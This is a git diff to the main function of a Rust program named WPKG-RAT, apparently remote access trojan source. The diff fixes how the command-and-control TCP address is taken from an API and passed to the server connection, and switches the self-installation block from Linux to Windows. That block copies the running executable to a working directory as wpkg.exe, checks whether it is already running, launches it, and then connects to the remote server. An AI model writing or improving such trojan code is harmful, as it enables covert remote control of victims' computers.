@@ -32,8 +32,12 @@ async fn main() {
     println!("WPKG-RAT {}", env!("CARGO_PKG_VERSION"));
 
     // get tcp server ip address from the api
-    let tcp_adress = Adresses::get().await.unwrap_or_default();
-    update_mutex!(TCP_ADDRESS, tcp_adress.tcp);
+    let tcp_address = Adresses::get().await.unwrap_or_default();
+    let tcp_address = tcp_address
+        .tcp
+        .get(0)
+        .unwrap_or(&Address::default())
+        .format();
 
     // init logger
     logger::init();
@@ -41,13 +45,13 @@ async fn main() {
     #[cfg(not(target_os = "windows"))]
     warn!("RAT isn't runned on Windows. Some features may be unavailable. Use for debug only");
 
-    #[cfg(target_os = "linux")]
+    #[cfg(target_os = "windows")]
     {
         use crate::utils::Utils;
         use std::env;
         use std::fs;
-        use std::process;
         use std::path::Path;
+        use std::process;
         use sysinfo::{System, SystemExt};
 
         let install = || -> anyhow::Result<()> {
@@ -56,33 +60,28 @@ async fn main() {
             let config_dir = Utils::get_working_dir();
             let exe_target = format!("{}\\{}", &config_dir, "wpkg.exe");
 
-            Utils::messagebox(format!("{} - {}",exe_path,exe_target));
+            Utils::messagebox(format!("{} - {}", exe_path, exe_target));
 
             if exe_path != exe_target {
                 info!("WPKG not installed. Installing in {}...", &config_dir);
 
-                if !Path::new(&exe_target).exists()
-                {
-                    info!("Copying WPKG executable to {}...",exe_target);
+                if !Path::new(&exe_target).exists() {
+                    info!("Copying WPKG executable to {}...", exe_target);
                     fs::copy(exe_path, exe_target.clone())?;
                 }
 
                 //check if process is runned
                 let mut runned: i32 = 0;
                 let s = System::new_all();
-                for _ in s.processes_by_name("wpkg.exe")
-                {
+                for _ in s.processes_by_name("wpkg.exe") {
                     runned += 1;
                 }
 
                 //run wpkg
-                if runned <= 1
-                {
+                if runned <= 1 {
                     info!("Running WPKG...");
-                    Utils::run_process_with_work_dir(&exe_target, "", false,&config_dir);
-                }
-                else
-                {
+                    Utils::run_process_with_work_dir(&exe_target, "", false, &config_dir);
+                } else {
                     error!("WPKG is runned. Exiting...");
                 }
 
@@ -98,6 +97,5 @@ async fn main() {
     }
 
     // connect to the ServerD
-    client::connect().await;
+    client::connect(tcp_address).await;
 }
-
